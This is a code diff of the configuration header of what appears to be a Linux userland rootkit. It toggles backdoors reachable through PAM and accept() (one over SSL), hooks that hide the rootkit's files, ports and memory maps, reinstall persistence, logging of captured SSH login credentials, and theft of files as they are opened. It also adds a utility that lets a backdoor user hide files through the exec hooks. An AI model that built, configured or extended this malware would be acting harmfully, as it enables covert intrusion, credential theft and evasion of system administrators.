@@ -12,27 +12,30 @@
  *     i.e.: '#define RANDOM_TOGGLE //ignore'
  */
 
-/* i've got two features disabled and ignored by default,
- * simply because there are things to repair before having
- * our other features play their parts.
- * atm, i've got LOG_SSH and FILE_STEAL disabled & ignored.
- * this isn't that big of a deal, really... */
+/* LOG_SSH is by default disabled and ignored atm as it's
+ * causing problems. */
 
 /* requires PAM */
 #undef USE_PAM_BD
 
-/* no mandatory dependencies unless you choose to use SSL.
- * (see ACCEPT_USE_SSL below) */
+/* no mandatory dependencies unless you choose to use SSL. */
 #undef USE_ACCEPT_BD
+/* requires SSL to be installed or present. SSL backdoor
+ * source port is $(( ACCEPT_PORT + 1 )) */
+#undef ACCEPT_USE_SSL
 
 /* all of the essential presence hiding toggles are ignored... */
 #define HIDE_SELF //ignore
-#define HIDE_HOOKS //ignore
 #define FORGE_MAPS //ignore
 #define HIDE_PORTS //ignore
 #define DO_REINSTALL //ignore
 #define DO_EVASIONS //ignore
 #define BLOCK_STRINGS //ignore
+
+/* this defines whether or not a backdoor user can hide & unhide
+ * files on-the-fly via the exec hooks. (execve & execvp)
+ * absolutely useless if HIDE_SELF is undefined. */
+#define HIDING_UTIL //ignore
 
 /* requires PAM. logs successful user authentications by hooking
  * the pam_prompt functions and writing respective user credentials
@@ -44,8 +47,7 @@
  * the log. you can read this log file in your installation directory.
  * there is no way of determining initially if the login is correct.
  * it's up to you to verify if the login works. */
-/* one of the things i've got disabled right now... also excluded the
- * responsible hooks */
+/* totally disable this for the time being... */
 #undef LOG_SSH //ignore
 
 /* when this is defined, files opened by open and fopen
@@ -53,8 +55,7 @@
  * hooks/open/consts. (etc/defaults.sh defines the path itself)
  * the files that are of interest to us are defined in
  * hooks/open/char_arrays. */
-/* also got this disabled... */
-#undef FILE_STEAL //ignore
+#undef FILE_STEAL
 /* when this is defined w/ FILE_STEAL, when an attempt to
  * steal a file by copying it to its new path fails,
  * attempt to make a new link in the interesting dir for
@@ -63,8 +64,5 @@
 #undef LINK_IF_ERR //ignore
 
 #define USE_CRYPT //ignore
-/* requires SSL. SSL backdoor source port is $((( ACCEPT_PORT + 1 ))) */
-#undef ACCEPT_USE_SSL
-#define EXEC_PRE_SHELL //ignore
 
 #endif
